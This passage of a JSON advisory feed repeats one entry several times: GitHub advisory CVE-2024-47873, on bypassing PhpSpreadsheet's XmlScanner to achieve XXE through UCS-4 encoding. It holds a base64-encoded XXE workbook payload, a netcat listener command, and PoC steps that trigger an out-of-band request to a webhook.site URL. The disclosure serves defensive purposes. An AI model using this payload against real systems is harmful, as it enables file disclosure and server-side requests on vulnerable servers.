ItMkExMy0xMUU1LUIzNDUtRkVGRjgxOUNEQzlGfSI%2BPGxvZXh0OmV4dENhbGNQciBzdHJpbmdSZWZTeW50YXg9IkNhbGNBMSIvPjwvZXh0PjwvZXh0THN0Pjwvd29ya2Jvb2s%2B.\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17334157/payload.xlsx\">payload.xlsx</a> file, which contains a payload similar to the payload from the details section, but with the URL <code>https://webhook.site/65744200-63d2-43a2-a6a0-cca8d6b0d50a</code> instead of the <code>http://127.0.0.1:12345/ext.dtd</code> URL, in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on <a href=\"https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a\">https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47873\">https://nvd.nist.gov/vuln/detail/CVE-2024-47873</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w",
            "title": "[phpoffice/phpspreadsheet] XmlScanner bypass leads to XXE",
            "date_modified": "2024-11-18T20:01:24.000Z",
            "date_published": "2024-11-18T20:01:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, the regexes used in the <code>scan</code> method and the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method can be bypassed by using UCS-4 and encoding guessing as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>scan</code> method converts the input in the UTF-8 encoding if it is not already in the UTF-8 encoding with the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L76\"><code>toUtf8</code> method</a>.\nThen, the <code>scan</code> method uses a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L79\">regex</a> which would also work with 16-bit encoding.</p>\n<p>However, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using an encoding which has more than 8 bits, since the regex does not expect null bytes, and the XML library will also autodetect the encoding as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-32BE%20(12001)')&amp;input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2IiBzdGFuZGFsb25lPSJ5ZXMiPz4KPCFET0NUWVBFIG1lc3NhZ2UgWwogICAgPCFFTlRJVFkgJSBleHQgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xOjEyMzQ1L2V4dC5kdGQiPgogICAgJWV4dDsKXT4KPHdvcmtib29rIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvc3ByZWFkc2hlZXRtbC8yMDA2L21haW4iIHhtbG5zOnI9Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L3JlbGF0aW9uc2hpcHMiPjxmaWxlVmVyc2lvbiBhcHBOYW1lPSJDYWxjIi8%2BPHdvcmtib29rUHIgYmFja3VwRmlsZT0iZmFsc2UiIHNob3dPYmplY3RzPSJhbGwiIGRhdGUxOTA0PSJmYWxzZSIvPjx3b3JrYm9va1Byb3RlY3Rpb24vPjxib29rVmlld3M%2BPHdvcmtib29rVmlldyBzaG93SG9yaXpvbnRhbFNjcm9sbD0idHJ1ZSIgc2hvd1ZlcnRpY2FsU2Nyb2xsPSJ0cnVlIiBzaG93U2hlZXRUYWJzPSJ0cnVlIiB4V2luZG93PSIwIiB5V2luZG93PSIwIiB3aW5kb3dXaWR0aD0iMTYzODQiIHdpbmRvd0hlaWdodD0iODE5MiIgdGFiUmF0aW89IjUwMCIgZmlyc3RTaGVldD0iMCIgYWN0aXZlVGFiPSIwIi8%2BPC9ib29rVmlld3M%2BPHNoZWV0cz48c2hlZXQgbmFtZT0iU2hlZXQxIiBzaGVldElkPSIxIiBzdGF0ZT0idmlzaWJsZSIgcjppZD0icklkMiIvPjwvc2hlZXRzPjxjYWxjUHIgaXRlcmF0ZUNvdW50PSIxMDAiIHJlZk1vZGU9IkExIiBpdGVyYXRlPSJmYWxzZSIgaXRlcmF0ZURlbHRhPSIwLjAwMSIvPjxleHRMc3Q%2BPGV4dCB4bWxuczpsb2V4dD0iaHR0cDovL3NjaGVtYXMubGlicmVvZmZpY2Uub3JnLyIgdXJpPSJ7NzYyNkM4NjItMkExMy0xMUU1LUIzNDUtRkVGRjgxOUNEQzlGfSI%2BPGxvZXh0OmV4dENhbGNQciBzdHJpbmdSZWZTeW50YXg9IkNhbGNBMSIvPjwvZXh0PjwvZXh0THN0Pjwvd29ya2Jvb2s%2B.\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17334157/payload.xlsx\">payload.xlsx</a> file, which contains a payload similar to the payload from the details section, but with the URL <code>https://webhook.site/65744200-63d2-43a2-a6a0-cca8d6b0d50a</code> instead of the <code>http://127.0.0.1:12345/ext.dtd</code> URL, in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on <a href=\"https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a\">https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47873\">https://nvd.nist.gov/vuln/detail/CVE-2024-47873</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w",
            "title": "[phpoffice/phpspreadsheet] XmlScanner bypass leads to XXE",
            "date_modified": "2024-11-18T20:01:24.000Z",
            "date_published": "2024-11-18T20:01:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, the regexes used in the <code>scan</code> method and the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method can be bypassed by using UCS-4 and encoding guessing as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>scan</code> method converts the input in the UTF-8 encoding if it is not already in the UTF-8 encoding with the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L76\"><code>toUtf8</code> method</a>.\nThen, the <code>scan</code> method uses a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L79\">regex</a> which would also work with 16-bit encoding.</p>\n<p>However, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using an encoding which has more than 8 bits, since the regex does not expect null bytes, and the XML library will also autodetect the encoding as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-32BE%20(12001)')&amp;input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2IiBzdGFuZGFsb25lPSJ5ZXMiPz4KPCFET0NUWVBFIG1lc3NhZ2UgWwogICAgPCFFTlRJVFkgJSBleHQgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xOjEyMzQ1L2V4dC5kdGQiPgogICAgJWV4dDsKXT4KPHdvcmtib29rIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvc3ByZWFkc2hlZXRtbC8yMDA2L21haW4iIHhtbG5zOnI9Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L3JlbGF0aW9uc2hpcHMiPjxmaWxlVmVyc2lvbiBhcHBOYW1lPSJDYWxjIi8%2BPHdvcmtib29rUHIgYmFja3VwRmlsZT0iZmFsc2UiIHNob3dPYmplY3RzPSJhbGwiIGRhdGUxOTA0PSJmYWxzZSIvPjx3b3JrYm9va1Byb3RlY3Rpb24vPjxib29rVmlld3M%2BPHdvcmtib29rVmlldyBzaG93SG9yaXpvbnRhbFNjcm9sbD0idHJ1ZSIgc2hvd1ZlcnRpY2FsU2Nyb2xsPSJ0cnVlIiBzaG93U2hlZXRUYWJzPSJ0cnVlIiB4V2luZG93PSIwIiB5V2luZG93PSIwIiB3aW5kb3dXaWR0aD0iMTYzODQiIHdpbmRvd0hlaWdodD0iODE5MiIgdGFiUmF0aW89IjUwMCIgZmlyc3RTaGVldD0iMCIgYWN0aXZlVGFiPSIwIi8%2BPC9ib29rVmlld3M%2BPHNoZWV0cz48c2hlZXQgbmFtZT0iU2hlZXQxIiBzaGVldElkPSIxIiBzdGF0ZT0idmlzaWJsZSIgcjppZD0icklkMiIvPjwvc2hlZXRzPjxjYWxjUHIgaXRlcmF0ZUNvdW50PSIxMDAiIHJlZk1vZGU9IkExIiBpdGVyYXRlPSJmYWxzZSIgaXRlcmF0ZURlbHRhPSIwLjAwMSIvPjxleHRMc3Q%2BPGV4dCB4bWxuczpsb2V4dD0iaHR0cDovL3NjaGVtYXMubGlicmVvZmZpY2Uub3JnLyIgdXJpPSJ7NzYyNkM4NjItMkExMy0xMUU1LUIzNDUtRkVGRjgxOUNEQzlGfSI%2BPGxvZXh0OmV4dENhbGNQciBzdHJpbmdSZWZTeW50YXg9IkNhbGNBMSIvPjwvZXh0PjwvZXh0THN0Pjwvd29ya2Jvb2s%2B.\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17334157/payload.xlsx\">payload.xlsx</a> file, which contains a payload similar to the payload from the details section, but with the URL <code>https://webhook.site/65744200-63d2-43a2-a6a0-cca8d6b0d50a</code> instead of the <code>http://127.0.0.1:12345/ext.dtd</code> URL, in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on <a href=\"https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a\">https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47873\">https://nvd.nist.gov/vuln/detail/CVE-2024-47873</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w",
            "title": "[phpoffice/phpspreadsheet] XmlScanner bypass leads to XXE",
            "date_modified": "2024-11-18T20:01:24.000Z",
            "date_published": "2024-11-18T20:01:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, the regexes used in the <code>scan</code> method and the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method can be bypassed by using UCS-4 and encoding guessing as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>scan</code> method converts the input in the UTF-8 encoding if it is not already in the UTF-8 encoding with the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L76\"><code>toUtf8</code> method</a>.\nThen, the <code>scan</code> method uses a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L79\">regex</a> which would also work with 16-bit encoding.</p>\n<p>However, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using an encoding which has more than 8 bits, since the regex does not expect null bytes, and the XML library will also autodetect the encoding as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-32BE%20(12001)')&amp;input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2IiBzdGFuZGFsb25lPSJ5ZXMiPz4KPCFET0NUWVBFIG1lc3NhZ2UgWwogICAgPCFFTlRJVFkgJSBleHQgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xOjEyMzQ1L2V4dC5kdGQiPgogICAgJWV4dDsKXT4KPHdvcmtib29rIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvc3ByZWFkc2hlZXRtbC8yMDA2L21haW4iIHhtbG5zOnI9Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L3JlbGF0aW9uc2hpcHMiPjxmaWxlVmVyc2lvbiBhcHBOYW1lPSJDYWxjIi8%2BPHdvcmtib29rUHIgYmFja3VwRmlsZT0iZmFsc2UiIHNob3dPYmplY3RzPSJhbGwiIGRhdGUxOTA0PSJmYWxzZSIvPjx3b3JrYm9va1Byb3RlY3Rpb24vPjxib29rVmlld3M%2BPHdvcmtib29rVmlldyBzaG93SG9yaXpvbnRhbFNjcm9sbD0idHJ1ZSIgc2hvd1ZlcnRpY2FsU2Nyb2xsPSJ0cnVlIiBzaG93U2hlZXRUYWJzPSJ0cnVlIiB4V2luZG93PSIwIiB5V2luZG93PSIwIiB3aW5kb3dXaWR0aD0iMTYzODQiIHdpbmRvd0hlaWdodD0iODE5MiIgdGFiUmF0aW89IjUwMCIgZmlyc3RTaGVldD0iMCIgYWN0aXZlVGFiPSIwIi8%2BPC9ib29rVmlld3M%2BPHNoZWV0cz48c2hlZXQgbmFtZT0iU2hlZXQxIiBzaGVldElkPSIxIiBzdGF0ZT0idmlzaWJsZSIgcjppZD0icklkMiIvPjwvc2hlZXRzPjxjYWxjUHIgaXRlcmF0ZUNvdW50PSIxMDAiIHJlZk1vZGU9IkExIiBpdGVyYXRlPSJmYWxzZSIgaXRlcmF0ZURlbHRhPSIwLjAwMSIvPjxleHRMc3Q%2BPGV4dCB4bWxuczpsb2V4dD0iaHR0cDovL3NjaGVtYXMubGlicmVvZmZpY2Uub3JnLyIgdXJpPSJ7NzYyNkM4NjItMkExMy0xMUU1LUIzNDUtRkVGRjgxOUNEQzlGfSI%2BPGxvZXh0OmV4dENhbGNQciBzdHJpbmdSZWZTeW50YXg9IkNhbGNBMSIvPjwvZXh0PjwvZXh0THN0Pjwvd29ya2Jvb2s%2B.\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17334157/payload.xlsx\">payload.xlsx</a> file, which contains a payload similar to the payload from the details section, but with the URL <code>https://webhook.site/65744200-63d2-43a2-a6a0-cca8d6b0d50a</code> instead of the <code>http://127.0.0.1:12345/ext.dtd</code> URL, in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on <a href=\"https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a\">https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n<li><a 